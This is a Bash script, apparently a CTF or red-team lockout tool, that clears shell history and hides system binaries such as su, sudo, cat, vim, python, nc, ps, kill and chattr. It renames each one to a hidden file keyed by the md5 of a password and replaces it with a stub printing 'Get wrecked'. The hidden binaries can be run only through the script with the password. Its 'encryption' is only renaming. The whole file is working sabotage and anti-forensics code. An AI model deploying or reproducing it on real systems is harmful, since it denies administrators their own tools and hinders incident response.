#!/bin/bash

# Array of binary names
binaries=("su" "sudo" "cat" "nano" "vi" "vim" "python3" "python" "php" "nc" "netcat" "grep" "sed" "ls" "tcpdump" "whoami" "ping" "sleep" "base64" "base32" "xxd" "env" "users" "kill" "pkill" "top" "ps" "netstat" "w" "tcpdump" "chattr")

fake_output="Get wrecked"

history -c

# Check for help flag
if [[ "$1" == "-h" ]]; then
    echo "Usage: $0 [options] <password> <binary> [args]"
    echo "Options:"
    echo "  -e  Encrypt the binary with the given password (if no binary is given, encrypt all the binaries)"
    echo "  -d  Decrypt the binary with the given password (if no binary is given, decrypt all the binaries)"
    echo "  -h  Display this help message"
    exit 0
fi
# Check if the command line option -e is set
if [[ "$1" == "-e" ]]; then
    # Check if the password is set
    if [[ -z "$2" ]]; then
        echo "Error: No password given"
        exit 1
    fi

    # Check if a specific binary is set
    if [[ -n "$3" ]]; then
        # If it is, then encrypt only that binary

        # Get the full path of the binary
        binary_path=$(which "$3")

        # Check if the binary exists
        if [[ ! -f "$binary_path" ]]; then
            echo "Error: Invalid binary"
            exit 1
        fi

        # Rename the binary to the md5 of its name concatenated with the password
        new_name=$(echo -n "$2$3" | md5sum | awk '{print $1}')
        # Prepend the original path directory to the new name
        new_name=$(dirname "$binary_path")"/.$new_name"
        mv "$binary_path" "$new_name"

        # Create a new shell script with the original name
        echo -e "#!/bin/sh\necho '$fake_output'" > "$binary_path"
        chmod +x "$binary_path"
        exit 0
    else
        # If no binary is specified then encrypt all the binaries

        # Loop through the binary names
        for binary in "${binaries[@]}"; do
            # Get the full path of the binary
            binary_path=$(which "$binary")

            # Check if the binary exists
            if [[ ! -f "$binary_path" ]]; then
                # If it doesn't, then skip it
                continue
            fi

            # Rename the binary to the md5 of its name
            new_name=$(echo -n "$2$binary" | md5sum | awk '{print $1}')
            # Prepend the original path directory to the new name
            new_name=$(dirname "$binary_path")"/.$new_name"
            mv "$binary_path" "$new_name"

            # Create a new shell script with the original name
            echo -e "#!/bin/sh\necho '$fake_output'" > "$binary_path"
            chmod +x "$binary_path"
        done
    fi
elif [[ "$1" == "-d" ]]; then
    # Check if the password is set
    if [[ -z "$2" ]]; then
        echo "Error: No password given"
        exit 1
    fi

    # Check if a specific binary is set
    if [[ -n "$3" ]]; then
        # If it is, then decrypt only that binary

        # Rename the binary to the md5 of its name concatenated with the password
        old_name=$(echo -n "$2$3" | md5sum | awk '{print $1}')

        # Get the full path of the binary
        old_name=$(which ".$old_name")

        # Check if the binary exists
        if [[ ! -f "$old_name" ]]; then
            echo "Error: Invalid binary or password"
            exit 1
        fi

        # Prepend the original path directory to the new name
        new_name=$(dirname "$old_name")"/$3"
        mv "$old_name" "$new_name"
        exit 0
    else
        # If no binary is specified then decrypt all the binaries

        # Loop through the binary names
        for binary in "${binaries[@]}"; do
            # Rename the binary to the md5 of its name
            old_name=$(echo -n "$2$binary" | md5sum | awk '{print $1}')

            # Get the full path of the binary
            old_name=$(which ".$old_name")

            # Check if the binary exists
            if [[ ! -f "$old_name" ]]; then
                # If it doesn't, then skip it
                continue
            fi

            # Prepend the original path directory to the new name
            new_name=$(dirname "$old_name")"/$binary"
            mv "$old_name" "$new_name"
        done
        exit 0
    fi
else
    # Run in translation mode - translate argv[1] and call it with argv[2:]
    # Check if the password and binary are set
    if [[ -z "$1" || -z "$2" ]]; then
        echo "Error: Password and binary not given (use -h for help)"
        exit 1
    fi
    # Check if the binary is in the array
    if [[ " ${binaries[@]} " =~ " $2 " ]]; then
        # If it is, then run the binary with the rest of the arguments
        new_name=$(echo -n "$1$2" | md5sum | awk '{print $1}')

        # Get the full path of the binary
        new_name=$(which ".$new_name")

        # Check if the binary exists
        if [[ ! -f "$new_name" ]]; then
            echo "Error: Invalid password or binary"
            exit 1
        fi

        # Run the binary with the rest of the arguments
        "$new_name" "${@:3}"
        exit 0
    fi
fi